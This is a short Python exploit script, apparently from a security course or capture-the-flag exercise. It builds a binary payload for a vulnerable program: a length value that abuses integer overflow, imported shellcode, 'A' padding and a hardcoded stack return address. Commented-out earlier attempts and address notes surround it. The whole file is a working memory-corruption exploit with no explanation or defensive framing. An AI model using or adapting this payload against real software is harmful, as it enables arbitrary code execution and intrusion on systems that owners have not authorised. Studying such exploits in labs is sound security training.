import sys
from shellcode import shellcode
# sys.stdout.buffer.write(int(1073742024).to_bytes(4,'little'))
# sys.stdout.buffer.write(shellcode)
# for num in range (197):
#     sys.stdout.buffer.write(int(204).to_bytes(4,'little'))
# sys.stdout.buffer.write(int (204).to_bytes (3,'little'))
# sys.stdout.buffer.write(0xfff6cc64.to_bytes(4, 'little' ))
#Start of shellcode = Oxfff6c930

sys.stdout.buffer.write((int)((4294967295+len(shellcode)) / 4).to_bytes(4,'little')
                        + shellcode + b'A'*(55) + 0xfff6cc00.to_bytes(4, 'little')
                        )


#0x08048ccb
#0xfff6cc68
#